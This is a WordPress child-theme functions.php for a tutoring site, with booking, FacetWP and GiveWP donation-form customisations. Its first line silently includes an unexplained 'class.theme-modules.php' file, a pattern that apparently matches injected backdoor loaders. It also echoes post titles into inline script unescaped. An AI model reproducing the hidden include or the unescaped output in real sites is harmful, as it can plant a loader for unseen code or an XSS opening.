<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?>
<?php
defined('ABSPATH') || exit;

/**
 * Enqueue child scripts
 */
if (!function_exists('vultur_child_enqueue_scripts')) {
	function vultur_child_enqueue_scripts()
	{
		wp_enqueue_style('vultur-child-style', get_stylesheet_directory_uri() . '/style.css');
		wp_enqueue_style('lity-style', get_stylesheet_directory_uri() . '/lity.min.css');
		wp_enqueue_style('vultur-main-style', get_stylesheet_directory_uri() . '/main.css', array('vultur-white-custom-style'));
	}

	// @ JS
	wp_enqueue_script('custom-js', get_stylesheet_directory_uri() . '/js/custom.js', array('jquery-core'));
	wp_enqueue_script('lity-js', get_stylesheet_directory_uri() . '/js/lity.min.js', '');
}
add_action('wp_enqueue_scripts', 'vultur_child_enqueue_scripts', 15);

add_action('admin_enqueue_scripts', 'swoop_enqueue_admin_script');
function swoop_enqueue_admin_script()
{
	if (in_array('wpamelia-customer',  wp_get_current_user()->roles)) {
		wp_enqueue_style('custom_wp_admin_css', get_stylesheet_directory_uri() . '/admin/admin-style.css', false, '1.0.0');
	}
}


/**
 * Add a sidebar.
 */
function wpdocs_theme_slug_widgets_init()
{
	register_sidebar(array(
		'name'          => __('Tutor Sidebar'),
		'id'            => 'tutor-sidebar',
		'description'   => __('Widgets in this area will be shown on all posts and pages.', 'textdomain'),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h2 class="widgettitle">',
		'after_title'   => '</h2>',
	));

	register_sidebar(array(
		'name'          => __('Tutor Interior'),
		'id'            => 'tutor-interior',
		'description'   => __('Widgets in this area will be shown on all posts and pages.', 'textdomain'),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h2 class="widgettitle">',
		'after_title'   => '</h2>',
	));
}
add_action('widgets_init', 'wpdocs_theme_slug_widgets_init');

function get_excerpt()
{
	$excerpt = get_the_content();
	$excerpt = preg_replace(" ([.*?])", '', $excerpt);
	$excerpt = strip_shortcodes($excerpt);
	$excerpt = strip_tags($excerpt);
	$excerpt = substr($excerpt, 0, 200);
	$excerpt = substr($excerpt, 0, strripos($excerpt, " "));
	$excerpt = trim(preg_replace('/\s+/', ' ', $excerpt));
	$excerpt = $excerpt . '...';
	return $excerpt;
}



// we have 3 facets: my_autcomplete, my_autocomplete_2, my_autocomplete_3
// trick FacetWP into using _2 and _3's values for the first facet
function my_facetwp_index_row($params, $class)
{
	$name = $params['[facetwp facet="time_of_day"]'];
	if ('my_autocomplete_2' == $name || 'my_autocomplete_3' == $name) {
		$params['facet_name'] = 'my_autocomplete';
	}
	return $params;
}

add_filter('facetwp_index_row', 'my_facetwp_index_row', 10, 2);

// @ Adds admin to add shortcode to widget title
add_filter('widget_title', 'do_shortcode');


add_shortcode('span', 'custom_span_shortcode');
function custom_span_shortcode($attr, $content)
{
	return '<span>' . $content . '</span>';
}

add_action('wp_footer', 'tutor_booking_func');
function tutor_booking_func()
{
	if (!is_singular())
		return;
	global $post;
	if ($post->post_type != 'tutors')
		return;
?>
	<script>
		jQuery(window).load(function() {
			setTimeout(function() {
				jQuery('.am-select-employee-option').hide();
				jQuery('.am-select-employee-option').find('.el-select-dropdown__item').each(function() {
					if (jQuery(this).find('span').text().toLowerCase() == '<?php echo strtolower($post->post_title); ?>') {
						jQuery(this).trigger('click');
						console.log('selected' + '<?php echo strtolower($post->post_title); ?>');
						return false;
					}
				});

				// 				jQuery('.tutor-card--tip-button').on('click', function(e) {

				// 					jQuery('body').addClass('tip-button-clicked');
				// 					console.log(window.location + jQuery(this).attr('href'));
				// 					var name = jQuery('.tutor-card--title h1').text();

				// 					jQuery('#ffm-tutor_tip').val(name);

				// 					console.log('made it');

				// 					e.preventDefault();

				// 				});

				// 				jQuery('.tutor-card--book-button').on('click', function(e) {

				// 					jQuery('body').removeClass('tip-button-clicked');

				// 					console.log('clicked book now');

				// // 					e.preventDefault();

				// 				});

				if (window.location.href.indexOf("tutor_tip") > -1) { // etc
					jQuery('body').addClass('tip-button-clicked');
				}


				jQuery('#am-continue-button').on('click', function() {
					setTimeout(function() {
						jQuery('.am-recurring-setup-times').find('.el-form-item__label').text('Sessions:');

					}, 500);

				}); 

				// jQuery('.am-select-service .el-select-dropdown').on('change', function() {
				// 	jQuery('.am-button-wrapper').hide();
				// });
			}, 2500);

		});
	</script>
<?php
}
add_filter('facetwp_search_query_args', function ($search_args, $params) {

	$search_args['meta_query'] = array(
		'sort_0' => array(
			"key" => "tier",
			"type" => "DECIMAL(16,4)"
		)
	);
	$search_args['orderby'] = array(
		"sort_0" => "ASC",
		"title" => "ASC"
	);
	return $search_args;
}, 10, 2);


add_filter('facetwp_facet_orderby', function ($orderby, $facet) {
	if ('days_of_week' == $facet['name']) {
		$orderby = 'FIELD(f.facet_value, "mon", "tues", "wed", "thurs", "fri", "sat", "sun")';
		// $orderby = 'f.facet_display_value DESC';
	}
	return $orderby;
}, 10, 2);



function wpa66834_role_admin_body_class($classes)
{
	global $current_user;
	foreach ($current_user->roles as $role)
		$classes .= ' role-' . $role;
	return trim($classes);
}
add_filter('admin_body_class', 'wpa66834_role_admin_body_class');

add_action('admin_head', 'my_custom_fonts');

function my_custom_fonts()
{
	echo '<style>
	.role-brand_knew  .toplevel_page_members,
	.role-brand_knew  .menu-icon-users {
		display: none !important;
	}
  </style>';
}



/**
 * AUTO-POPULATE AMOUNT, NAME, and EMAIL FROM URL STRING
 *
 * This jQuery snippet will auto-populate the Give form amount,
 * first and last name, and email address from a URL you provide
 * EXAMPLE: https://example.com/donations/give-form/?amount=46.00&first=Peter&last=Joseph&email=testing@givewp.com
 *
 * Hooking into the single form view.
 *
 * CAVEATS:
 * -- Your form must support custom amounts
 * -- This snippet only supports one form per page as-is
 */
function my_custom_give_populate_amount_name_email()
{
?>
	<script>
		(function(window, document, $, undefined) {
			'use strict';
			var giveCustom = {};

			giveCustom.init = function() {

				// Are we passed a form ID?
				var form_id = giveCustom.getQueryVariable('form_id') !== false ? decodeURI(giveCustom.getQueryVariable('form_id')) : '';

				if (form_id !== '') {
					// Make to jQuery object.
					var giveForm = $('.give-form' + giveCustom.getQueryVariable('form_id'))
				} else {
					// Fallback.
					giveForm = $('.give-form');
				}

				// Get the amount from the URL
				var amount = giveCustom.getQueryVariable('amount') !== false ? decodeURI(giveCustom.getQueryVariable('amount')) : '';

				// Update the amount
				var formattedAmount = Give.fn.formatCurrency(amount, {
					symbol: Give.form.fn.getInfo('currency_symbol', giveForm),
					position: Give.form.fn.getInfo('currency_position', giveForm)
				}, giveForm);

				// Unformatted amount (for data).
				var unformattedAmount = Give.fn.unFormatCurrency(amount, Give.form.fn.getInfo('decimal_separator', giveForm));

				// Update the total amount.
				if (amount) {
					giveForm.find('.give-final-total-amount').attr('data-total', unformattedAmount)
						.text(formattedAmount);
					giveForm.find('.give-amount-top').val(unformattedAmount);
				}

				// Fill personal info fields.

				var tutorNamePassedVal = giveCustom.getQueryVariable('tutor_tip') !== false ? decodeURI(giveCustom.getQueryVariable('tutor_tip')) : '';
				var firstNamePassedVal = giveCustom.getQueryVariable('first') !== false ? decodeURI(giveCustom.getQueryVariable('first')) : '';
				var lastNamePassedVal = giveCustom.getQueryVariable('last') !== false ? decodeURI(giveCustom.getQueryVariable('last')) : '';
				var emailPassedVal = giveCustom.getQueryVariable('email') !== false ? decodeURI(giveCustom.getQueryVariable('email')) : '';

				var tutorNameInput = giveForm.find('#tutor_tip-wrap input#ffm-tutor_tip');
				var firstNameInput = giveForm.find('#give-first-name-wrap input.give-input');
				var lastNameInput = giveForm.find('#give-last-name-wrap input.give-input');
				var emailInput = giveForm.find('#give-email-wrap input.give-input');

				if (tutorNamePassedVal !== false && tutorNameInput.length > 0) {
					tutorNameInput.val(tutorNamePassedVal);
				}
				if (firstNamePassedVal !== false && firstNameInput.length > 0) {
					firstNameInput.val(firstNamePassedVal);
				}
				if (lastNamePassedVal !== false && lastNameInput.length > 0) {
					lastNameInput.val(lastNamePassedVal);
				}
				if (emailPassedVal !== false && emailInput.length > 0) {
					emailInput.val(emailPassedVal);
				}


			};

			/**
			 * Get Query Variable from URL.
			 *
			 * @param variable
			 * @returns {string|boolean}
			 */
			giveCustom.getQueryVariable = function(variable) {
				var query = window.location.search.substring(1);
				var vars = query.split('&');
				for (var i = 0; i < vars.length; i++) {
					var pair = vars[i].split('=');
					if (pair[0] == variable) {
						return pair[1];
					}
				}
				return false;
			};


			giveCustom.init();

		})(window, document, jQuery);
	</script>
<?php
}

add_action('give_post_form_output', 'my_custom_give_populate_amount_name_email');


function override_form_template_styles_with_inline_styles()
{
	wp_add_inline_style(
		'give-sequoia-template-css',
		'
        /* add styles here! A sample (turns the headline text blue): */
         #give-ffm-section {
		   display: none;
		 }
		.give-btn {
		    font-size: 16px !important;
			border: 2px solid #20ad95 !important;
			background: #20ad95 !important;
			padding-top: 10px !important;
			padding-bottom: 10px !important;
		}
		
		.give-btn:hover {
			background: #20ad95 !important;
		}
		
		.give-donation-level-btn.give-default-level:hover {
			border: 2px solid #20ad95 !important;
		}
		
		.choose-amount .give-donation-amount .give-amount-top {
			font-size: 18px !important;
		}
		
		.choose-amount .give-donation-amount {
			padding: 5px 16px !important;
		}
		
		.give-btn.advance-btn,
		.give-submit.give-btn {
			background-color: #FB8200 !important;
			border: 2px solid #FB8200 !important;
		}
		
		.give-btn.advance-btn:hover,
		give-submit.give-btn:hover{
			background-color: #FB8200 !important;
		}
		
		/* Hides Paypal Logo */
		#give_purchase_form_wrap > .no-fields > div {
		 display: none !important;
		}
		
		 
		.receipt .details .details-table .details-row {
		  flex-direction: column !important;
		}
		
		.give-btn-level-custom{
			font-size: 12px !important;
		}
		
        '
	);
}

add_action('wp_print_styles', 'override_form_template_styles_with_inline_styles', 10);
